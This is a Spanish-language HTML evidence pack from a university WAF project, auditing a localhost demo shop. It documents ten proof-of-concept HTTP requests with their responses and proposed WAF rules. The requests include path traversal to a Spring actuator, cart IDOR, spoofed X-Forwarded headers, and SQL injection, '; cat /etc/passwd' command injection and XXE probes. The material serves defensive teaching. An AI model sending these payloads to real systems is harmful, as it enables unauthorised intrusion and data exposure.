@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Evidence Pack · Pre-WAF Audit · The Store · TPE ITBA 1C 2026</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
+    background: #f5f7fa; color: #1f2937; line-height: 1.5; padding: 24px;
+  }
+  .container { max-width: 1100px; margin: 0 auto; }
+  header.cover {
+    background: linear-gradient(135deg, #1e3a8a 0%, #5b21b6 100%);
+    color: white; border-radius: 14px; padding: 36px; margin-bottom: 24px;
+    box-shadow: 0 10px 30px rgba(91,33,182,0.25);
+  }
+  header.cover h1 { font-size: 28px; margin-bottom: 6px; }
+  header.cover .subtitle { font-size: 16px; opacity: 0.92; margin-bottom: 18px; }
+  header.cover .meta { display: flex; gap: 24px; flex-wrap: wrap; font-size: 13px; opacity: 0.95; }
+  header.cover .meta b { font-weight: 700; }
+  .summary-box {
+    background: white; border-radius: 12px; padding: 20px 24px; margin-bottom: 24px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.06); border: 1px solid #e5e7eb;
+  }
+  .summary-box h2 { font-size: 15px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 14px; font-weight: 600; }
+  .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px,1fr)); gap: 16px; }
+  .stat-card { padding: 14px; border-radius: 8px; border: 1px solid #e5e7eb; }
+  .stat-card .v { font-size: 26px; font-weight: 700; }
+  .stat-card .l { font-size: 12px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 2px; }
+  .vuln-bg { background: #fef2f2; border-color: #fecaca; }
+  .vuln-bg .v { color: #dc2626; }
+  .blocked-bg { background: #f0fdf4; border-color: #bbf7d0; }
+  .blocked-bg .v { color: #16a34a; }
+  .info-bg { background: #eff6ff; border-color: #bfdbfe; }
+  .info-bg .v { color: #2563eb; }
+
+  .poc {
+    background: white; border-radius: 12px; margin-bottom: 16px;
+    border: 1px solid #e5e7eb; overflow: hidden;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+  }
+  .poc.crit { border-left: 5px solid #dc2626; }
+  .poc.high { border-left: 5px solid #ea580c; }
+  .poc.med { border-left: 5px solid #d97706; }
+  .poc-head { padding: 18px 22px; }
+  .poc-id {
+    display: inline-block; background: #f3f4f6; color: #374151;
+    padding: 2px 10px; border-radius: 12px; font-size: 11px;
+    font-weight: 700; margin-bottom: 8px; letter-spacing: 0.5px;
+  }
+  .poc-id.crit { background: #fee2e2; color: #991b1b; }
+  .poc-id.high { background: #fed7aa; color: #9a3412; }
+  .poc-id.med { background: #fef3c7; color: #92400e; }
+  .poc-title { font-size: 18px; font-weight: 600; color: #111827; margin-bottom: 6px; }
+  .poc-narrative { font-size: 14px; color: #4b5563; }
+
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0; border-top: 1px solid #e5e7eb; }
+  @media (max-width: 800px) { .grid { grid-template-columns: 1fr; } .right { border-left: none !important; border-top: 1px solid #e5e7eb; } }
+  .right { border-left: 1px solid #e5e7eb; }
+  .panel { padding: 18px 22px; }
+  .panel-label {
+    font-size: 10px; text-transform: uppercase; letter-spacing: 0.8px;
+    color: #6b7280; font-weight: 700; margin-bottom: 8px; display: flex;
+    align-items: center; gap: 6px;
+  }
+  .panel-label .dot { width: 6px; height: 6px; border-radius: 50%; }
+  .req-dot { background: #2563eb; }
+  .resp-dot { background: #16a34a; }
+  pre {
+    background: #0f172a; color: #e2e8f0; padding: 14px 16px;
+    border-radius: 8px; font-family: 'SF Mono', Menlo, Consolas, monospace;
+    font-size: 12px; line-height: 1.55; white-space: pre-wrap; word-break: break-word;
+    max-height: 280px; overflow: auto;
+  }
+  pre.req .method { color: #fbbf24; font-weight: 700; }
+  pre.req .path { color: #60a5fa; }
+  pre.req .header-name { color: #c084fc; }
+  pre.resp .status-2xx { color: #4ade80; font-weight: 700; }
+  pre.resp .status-4xx { color: #f87171; font-weight: 700; }
+  pre.resp .status-5xx { color: #f87171; font-weight: 700; }
+  .resp-meta { display: flex; gap: 14px; flex-wrap: wrap; font-size: 12px; color: #6b7280; margin-bottom: 8px; }
+  .resp-meta b { color: #111827; font-weight: 600; }
+  .takeaway {
+    padding: 14px 22px; background: #fef9c3; border-top: 1px solid #fde68a;
+    font-size: 13px; color: #713f12; display: flex; align-items: flex-start; gap: 10px;
+  }
+  .takeaway b { font-weight: 700; }
+  .takeaway::before { content: '💡'; flex-shrink: 0; }
+  .mitigation {
+    padding: 12px 22px; background: #ecfdf5; border-top: 1px solid #a7f3d0;
+    font-size: 13px; color: #065f46; display: flex; align-items: flex-start; gap: 10px;
+  }
+  .mitigation::before { content: '🛡️'; flex-shrink: 0; }
+  .mitigation code { background: #d1fae5; padding: 1px 5px; border-radius: 3px; font-family: 'SF Mono', Menlo, monospace; font-size: 12px; }
+
+  .toc {
+    background: white; border-radius: 12px; padding: 18px 24px; margin-bottom: 24px;
+    border: 1px solid #e5e7eb; box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+  }
+  .toc h3 { font-size: 13px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
+  .toc ol { list-style: none; counter-reset: poc; }
+  .toc ol li { counter-increment: poc; padding: 4px 0; font-size: 14px; display: flex; align-items: center; gap: 10px; }
+  .toc ol li::before {
+    content: counter(poc); display: inline-flex; align-items: center; justify-content: center;
+    width: 22px; height: 22px; border-radius: 50%; background: #1e293b; color: white;
+    font-size: 11px; font-weight: 700;
+  }
+  .toc a { color: #1e40af; text-decoration: none; }
+  .toc a:hover { text-decoration: underline; }
+  .toc .badge { font-size: 10px; font-weight: 700; padding: 2px 8px; border-radius: 10px; margin-left: auto; }
+  .toc .b-crit { background: #fee2e2; color: #991b1b; }
+  .toc .b-high { background: #fed7aa; color: #9a3412; }
+  .toc .b-med { background: #fef3c7; color: #92400e; }
+
+  footer {
+    text-align: center; color: #6b7280; font-size: 13px; margin: 32px 0 16px;
+    padding-top: 18px; border-top: 1px solid #e5e7eb;
+  }
+  footer code { background: #f3f4f6; padding: 1px 6px; border-radius: 3px; }
+</style>
+</head>
+<body>
+<div class="container">
+
+<header class="cover">
+  <h1>🛡️ Evidence Pack · Pre-WAF Security Audit</h1>
+  <div class="subtitle">The Store — auditoría en vivo del estado actual sin Web Application Firewall</div>
+  <div class="meta">
+    <span><b>TPE:</b> Protección de Servicios con WAF</span>
+    <span><b>Materia:</b> Redes de Información · ITBA · 1C 2026</span>
+    <span><b>Fecha del test:</b> 16-Abr-2026 17:42 UTC</span>
+    <span><b>Target:</b> http://localhost</span>
+    <span><b>Versión repo:</b> the-store-main (sin parches)</span>
+  </div>
+</header>
+
+<div class="summary-box">
+  <h2>Resumen del impacto</h2>
+  <div class="stats">
+    <div class="stat-card vuln-bg"><div class="v">8 / 10</div><div class="l">PoCs explotables</div></div>
+    <div class="stat-card vuln-bg"><div class="v">25 KB</div><div class="l">leakeados por hit</div></div>
+    <div class="stat-card vuln-bg"><div class="v">6 / 6</div><div class="l">headers seguridad faltantes</div></div>
+    <div class="stat-card vuln-bg"><div class="v">167</div><div class="l">req/s sin throttling</div></div>
+    <div class="stat-card info-bg"><div class="v">3 min</div><div class="l">duración de la kill chain</div></div>
+    <div class="stat-card info-bg"><div class="v">4 / 4</div><div class="l">backends ClusterIP alcanzables</div></div>
+  </div>
+</div>
+
+<div class="toc">
+  <h3>Pruebas incluidas</h3>
+  <ol>
+    <li><a href="#poc1">SSRF + Path Traversal vía /proxy/** → escape al actuator del UI</a><span class="badge b-crit">CRÍTICO</span></li>
+    <li><a href="#poc2">IDOR en /proxy/carts/{customerId} → carrito de cualquier usuario</a><span class="badge b-crit">CRÍTICO</span></li>
+    <li><a href="#poc3">Spring Actuator /prometheus expuesto → 25 KB de métricas</a><span class="badge b-high">ALTA</span></li>
+    <li><a href="#poc4">/actuator/health expuesto → estado de los downstreams</a><span class="badge b-high">ALTA</span></li>
+    <li><a href="#poc5">Backends ClusterIP alcanzables vía proxy</a><span class="badge b-high">ALTA</span></li>
+    <li><a href="#poc6">User-Agent de Nikto/sqlmap aceptado</a><span class="badge b-med">MEDIA</span></li>
+    <li><a href="#poc7">Sin rate limit (50 req paralelas → 200 OK)</a><span class="badge b-med">MEDIA</span></li>
+    <li><a href="#poc8">X-Forwarded-* spoofeable</a><span class="badge b-med">MEDIA</span></li>
+    <li><a href="#poc9">Catalog acepta SQLi/RCE en query string sin alarma</a><span class="badge b-med">MEDIA</span></li>
+    <li><a href="#poc10">Cero headers de seguridad enviados</a><span class="badge b-med">MEDIA</span></li>
+  </ol>
+</div>
+
+<!-- ======================== PoC 1 ======================== -->
+<div class="poc crit" id="poc1">
+  <div class="poc-head">
+    <div class="poc-id crit">PoC #1 · CRÍTICO</div>
+    <div class="poc-title">SSRF + Path Traversal vía <code>/proxy/**</code></div>
+    <div class="poc-narrative">El <code>ProxyController</code> de Spring concatena el path del cliente al endpoint del backend sin sanitizar. La normalización de URI hace que <code>../../</code> escape el host del backend y termine hitteando el actuator del propio UI. Cualquier filtro a nivel UI queda bypasseado.</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/proxy/catalog/../../actuator/prometheus</span> HTTP/1.1
+<span class="header-name">Host:</span> localhost
+<span class="header-name">User-Agent:</span> Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+<span class="header-name">Accept:</span> */*</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Response recibida</div>
+      <div class="resp-meta">
+        <span>Status: <b style="color:#dc2626">200 OK</b></span>
+        <span>Bytes: <b>25.383</b></span>
+        <span>Latency: <b>5 ms</b></span>
+      </div>
+      <pre class="resp"><span class="status-2xx">HTTP/1.1 200 OK</span>
+content-type: text/plain;version=0.0.4;charset=utf-8
+
+# HELP application_ready_time_seconds Time taken for the application to be ready to service requests
+# TYPE application_ready_time_seconds gauge
+application_ready_time_seconds{main_application_class="com.amazon.sample.ui.UiApplication"} 9.782
+# HELP disk_total_bytes Total space for path
+# TYPE disk_total_bytes gauge
+disk_total_bytes{path="/app/."} 1.081100128256E12
+# HELP disk_free_bytes Usable space for path
+# TYPE disk_free_bytes gauge
+disk_free_bytes{path="/app/."} 1.002170220544E12
+# HELP http_client_requests_active_seconds_count
+# TYPE http_client_requests_active_seconds_count counter
+http_client_requests_active_seconds_count{client_name="carts",exception="none",method="GET",outcome="UNKNOWN",status="CLIENT_ERROR",uri="none"} 0
+http_client_requests_active_seconds_count{client_name="catalog",...
+http_client_requests_active_seconds_count{client_name="checkout",...
+http_client_requests_active_seconds_count{client_name="orders",...
+…(25 KB en total — 175 series Prometheus)</pre>
+    </div>
+  </div>
+  <div class="takeaway"><span><b>Por qué duele:</b> el atacante recibe en una sola request los nombres de los 4 microservicios internos (<code>carts</code>, <code>catalog</code>, <code>checkout</code>, <code>orders</code>), capacidad de disco (1 TB), versión del JVM, paths llamados recientemente por OTROS atacantes, y excepciones internas. Es OSINT pasivo gratis sobre la infraestructura.</span></div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> OWASP CRS familia <code>930xxx</code> (LFI/path traversal) bloquea la traversal literal, regla custom <code>id:9001</code> bloquea cualquier URL que matchee <code>^/actuator/(env|heapdump|threaddump|loggers|metrics|prometheus|info)</code>.</span></div>
+</div>
+
+<!-- ======================== PoC 2 ======================== -->
+<div class="poc crit" id="poc2">
+  <div class="poc-head">
+    <div class="poc-id crit">PoC #2 · CRÍTICO</div>
+    <div class="poc-title">IDOR en <code>/proxy/carts/{customerId}</code></div>
+    <div class="poc-narrative">El backend <code>carts</code> es ClusterIP — por diseño NO debería ser alcanzable desde Internet. El <code>ProxyController</code> lo expone, y el segmento del path se interpreta como <code>customerId</code> sin pedir autenticación. Cualquiera puede enumerar carritos.</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/proxy/carts/admin</span> HTTP/1.1
+<span class="header-name">Host:</span> localhost
+<span class="header-name">Accept:</span> application/json</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Response recibida</div>
+      <div class="resp-meta">
+        <span>Status: <b style="color:#dc2626">200 OK</b></span>
+        <span>Bytes: <b>33</b></span>
+        <span>Latency: <b>19 ms</b></span>
+      </div>
+      <pre class="resp"><span class="status-2xx">HTTP/1.1 200 OK</span>
+content-type: application/json
+
+{"customerId":"admin","items":[]}</pre>
+      <div style="margin-top:8px; font-size:12px; color:#6b7280">Probado también con <code>test</code>, <code>1</code>, <code>users</code>, <code>00000000-0000-0000-0000-000000000000</code> — todos devuelven 200 con su respectivo customerId.</div>
+    </div>
+  </div>
+  <div class="takeaway"><span><b>Por qué duele:</b> en este despliegue todos los carritos están vacíos, pero en producción cualquier carrito es enumerable. Si alguien activa <code>POST</code> en el ProxyController, también se vuelve <i>escribible</i> (hoy un POST devuelve 405).</span></div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> regla custom que bloquee <code>^/proxy/carts/</code> si no hay header <code>Authorization</code> o <code>Cookie</code> de sesión válida. Idealmente, el WAF + Service Mesh garantizan que los servicios ClusterIP solo respondan a requests con identidad mTLS.</span></div>
+</div>
+
+<!-- ======================== PoC 3 ======================== -->
+<div class="poc high" id="poc3">
+  <div class="poc-head">
+    <div class="poc-id high">PoC #3 · ALTA</div>
+    <div class="poc-title">Acceso directo a <code>/actuator/prometheus</code></div>
+    <div class="poc-narrative">Sin necesidad de path traversal — el endpoint Prometheus está expuesto directamente. El config <code>application.yml</code> incluye <code>info,health,metrics,prometheus</code> en el <code>management.endpoints.web.exposure.include</code>.</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/actuator/prometheus</span> HTTP/1.1
+<span class="header-name">Host:</span> localhost</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Response recibida</div>
+      <div class="resp-meta">
+        <span>Status: <b style="color:#dc2626">200 OK</b></span>
+        <span>Bytes: <b>24.468</b></span>
+      </div>
+      <pre class="resp"><span class="status-2xx">HTTP/1.1 200 OK</span>
+content-type: text/plain;version=0.0.4;charset=utf-8
+
+(mismo body de 25 KB que PoC #1, pero sin necesidad de proxy)</pre>
+    </div>
+  </div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> regla custom <code>id:9001</code> deny en path <code>^/actuator/.*</code> excepto <code>/actuator/health</code> que solo debe ser accesible desde el rango interno del cluster.</span></div>
+</div>
+
+<!-- ======================== PoC 4 ======================== -->
+<div class="poc high" id="poc4">
+  <div class="poc-head">
+    <div class="poc-id high">PoC #4 · ALTA</div>
+    <div class="poc-title"><code>/actuator/health</code> revela estado de downstreams</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/actuator/health</span> HTTP/1.1
+<span class="header-name">Host:</span> localhost</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Response recibida</div>
+      <div class="resp-meta">
+        <span>Status: <b style="color:#dc2626">200 OK</b></span>
+        <span>Bytes: <b>49</b></span>
+      </div>
+      <pre class="resp"><span class="status-2xx">HTTP/1.1 200 OK</span>
+content-type: application/vnd.spring-boot.actuator.v3+json
+
+{"status":"UP","groups":["liveness","readiness"]}</pre>
+    </div>
+  </div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> permitir solo health probes con UA <code>kube-probe/*</code> y origen del CIDR de pods.</span></div>
+</div>
+
+<!-- ======================== PoC 5 ======================== -->
+<div class="poc high" id="poc5">
+  <div class="poc-head">
+    <div class="poc-id high">PoC #5 · ALTA</div>
+    <div class="poc-title">Backends ClusterIP alcanzables vía proxy</div>
+    <div class="poc-narrative">Los servicios <code>catalog</code>, <code>carts</code>, <code>orders</code>, <code>checkout</code> están definidos como <code>ClusterIP</code> — sin Ingress propio. Sin embargo, el ProxyController los expone individualmente.</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Requests enviadas</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/proxy/orders/anything</span>
+<span class="method">GET</span> <span class="path">/proxy/checkout/anything</span>
+<span class="method">GET</span> <span class="path">/proxy/carts/anything</span>
+<span class="method">GET</span> <span class="path">/proxy/notreal/foo</span>  ← control negativo</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Responses recibidas</div>
+      <pre class="resp">orders   → <span class="status-4xx">404</span> {"timestamp":"...","status":404,"error":"Not Found",
+            "path":"/orders/anything"}                  ← Spring Boot
+checkout → <span class="status-4xx">404</span> {"message":"Checkout not found","error":"Not Found",
+            "statusCode":404}                            ← NestJS
+carts    → <span class="status-2xx">200</span> {"customerId":"anything","items":[]}        ← Spring Boot
+notreal  → <span class="status-4xx">404</span> {"timestamp":"...","path":"/proxy/notreal/foo",
+            "status":404}                                ← rebote del UI</pre>
+    </div>
+  </div>
+  <div class="takeaway"><span><b>Lo que aprendió Mallory en 4 requests:</b> los 3 backends responden con su propio formato de error (Spring vs NestJS), confirmando el stack de cada uno y el alcance del proxy. El servicio <code>notreal</code> rebota desde el UI (formato distinto) — útil para distinguir falsos negativos.</span></div>
+</div>
+
+<!-- ======================== PoC 6 ======================== -->
+<div class="poc med" id="poc6">
+  <div class="poc-head">
+    <div class="poc-id med">PoC #6 · MEDIA</div>
+    <div class="poc-title">User-Agent de scanners aceptado sin filtro</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/</span> HTTP/1.1
+<span class="header-name">Host:</span> localhost
+<span class="header-name">User-Agent:</span> sqlmap/1.7.2#stable (https://sqlmap.org)</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Response recibida</div>
+      <div class="resp-meta">
+        <span>Status: <b style="color:#dc2626">200 OK</b></span>
+        <span>Bytes: <b>19.973</b></span>
+      </div>
+      <pre class="resp"><span class="status-2xx">HTTP/1.1 200 OK</span>
+content-type: text/html
+
+&lt;!doctype html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;...
+(home page completa servida — sqlmap puede empezar a escanear)</pre>
+      <div style="margin-top:8px; font-size:12px; color:#6b7280">Probado también con <code>Nikto/2.5.0</code>, <code>Nuclei</code>, <code>DirBuster-1.0-RC1</code> — todos 200 OK.</div>
+    </div>
+  </div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> OWASP CRS familia <code>913xxx</code> matchea estos User-Agents y devuelve 403 directo.</span></div>
+</div>
+
+<!-- ======================== PoC 7 ======================== -->
+<div class="poc med" id="poc7">
+  <div class="poc-head">
+    <div class="poc-id med">PoC #7 · MEDIA</div>
+    <div class="poc-title">Sin rate limit · 50 requests paralelas</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req">await Promise.all(
+  Array.from({length: 50}, () => fetch(<span class="path">'/'</span>))
+);</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Resultado</div>
+      <div class="resp-meta">
+        <span>Total: <b>50</b></span>
+        <span>Throughput: <b>167 req/s</b></span>
+        <span>Duración: <b>597 ms</b></span>
+      </div>
+      <pre class="resp">distribución: { "<span class="status-2xx">200</span>": 50, "<span class="status-4xx">403</span>": 0, "<span class="status-4xx">429</span>": 0 }
+veredicto: ⚠️ NINGUNA fue limitada</pre>
+    </div>
+  </div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> annotation <code>nginx.ingress.kubernetes.io/limit-rps: "10"</code> + <code>limit-connections: "5"</code> + reglas CRS de offender tracking (<code>9051xx</code>).</span></div>
+</div>
+
+<!-- ======================== PoC 8 ======================== -->
+<div class="poc med" id="poc8">
+  <div class="poc-head">
+    <div class="poc-id med">PoC #8 · MEDIA</div>
+    <div class="poc-title">Spoofing de cabeceras X-Forwarded-*</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/</span> HTTP/1.1
+<span class="header-name">Host:</span> localhost
+<span class="header-name">X-Forwarded-For:</span> 8.8.8.8
+<span class="header-name">X-Forwarded-Proto:</span> https
+<span class="header-name">X-Forwarded-Host:</span> evil-bank.com
+<span class="header-name">X-Real-IP:</span> 8.8.8.8</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Response recibida</div>
+      <div class="resp-meta">
+        <span>Status: <b style="color:#dc2626">200 OK</b></span>
+        <span>Bytes: <b>19.973</b></span>
+      </div>
+      <pre class="resp"><span class="status-2xx">HTTP/1.1 200 OK</span>
+content-type: text/html
+
+(home renderizada normalmente — Spring loggeará "8.8.8.8" como IP origen,
+generará URLs como https://evil-bank.com/... debido a X-Forwarded-Host)</pre>
+    </div>
+  </div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> ModSecurity strip de headers <code>X-Forwarded-*</code> en phase:1 si la IP origen no está en la whitelist de proxies de confianza.</span></div>
+</div>
+
+<!-- ======================== PoC 9 ======================== -->
+<div class="poc med" id="poc9">
+  <div class="poc-head">
+    <div class="poc-id med">PoC #9 · MEDIA</div>
+    <div class="poc-title">Catalog acepta SQLi/RCE en query string sin alarma</div>
+    <div class="poc-narrative">Aunque el backend Go usa Gorm parametrizado (la SQLi <i>no</i> es explotable hoy), la app devuelve 200 OK al payload — el atacante NO recibe alarma e itera más payloads sofisticados.</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Requests enviadas</div>
+      <pre class="req"><span class="method">GET</span> <span class="path">/catalog?tag=' OR '1'='1</span>
+<span class="method">GET</span> <span class="path">/catalog?tag=; cat /etc/passwd</span>
+<span class="method">GET</span> <span class="path">/catalog?tag=&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;</span></pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Response recibida</div>
+      <pre class="resp">los 3 → <span class="status-2xx">200 OK</span> + página catálogo renderizada
+       (vista vacía porque ningún tag matchea, pero NO hay 403/406)</pre>
+    </div>
+  </div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> CRS <code>942100</code> (SQLi), <code>932100</code> (RCE), <code>933160</code> (PHP/cmd injection) — devuelven 403 ANTES de llegar al backend.</span></div>
+</div>
+
+<!-- ======================== PoC 10 ======================== -->
+<div class="poc med" id="poc10">
+  <div class="poc-head">
+    <div class="poc-id med">PoC #10 · MEDIA</div>
+    <div class="poc-title">Auditoría de headers de seguridad — 0 / 6 presentes</div>
+  </div>
+  <div class="grid">
+    <div class="panel">
+      <div class="panel-label"><span class="dot req-dot"></span>Request enviada</div>
+      <pre class="req"><span class="method">HEAD</span> <span class="path">/</span> HTTP/1.1
+<span class="header-name">Host:</span> localhost</pre>
+    </div>
+    <div class="panel right">
+      <div class="panel-label"><span class="dot resp-dot"></span>Headers recibidos (auditados)</div>
+      <pre class="resp">Strict-Transport-Security:    <span class="status-4xx">MISSING</span>
+X-Frame-Options:              <span class="status-4xx">MISSING</span>  → clickjacking posible
+X-Content-Type-Options:       <span class="status-4xx">MISSING</span>  → MIME sniffing
+Content-Security-Policy:      <span class="status-4xx">MISSING</span>  → XSS no mitigado
+Referrer-Policy:              <span class="status-4xx">MISSING</span>  → leak de referrer
+Permissions-Policy:           <span class="status-4xx">MISSING</span>  → APIs browser sin restringir</pre>
+    </div>
+  </div>
+  <div class="mitigation"><span><b>Mitigación post-WAF:</b> Nginx ConfigMap <code>add-headers</code> en ingress-nginx, agregando los 6 headers en cada response. Se aplica de forma blanket sin tocar la app.</span></div>
+</div>
+
+<footer>
+  <p>Evidence pack standalone · datos capturados en vivo el 16-Abr-2026 17:42 UTC contra <code>http://localhost</code>.</p>
+  <p style="margin-top:8px">Reproducir con: <code>./local.sh create-cluster --skip-tests</code> + abrir <code>demo/exploit-dashboard.html</code></p>
+</footer>
+
+</div>
+</body>
+</html>
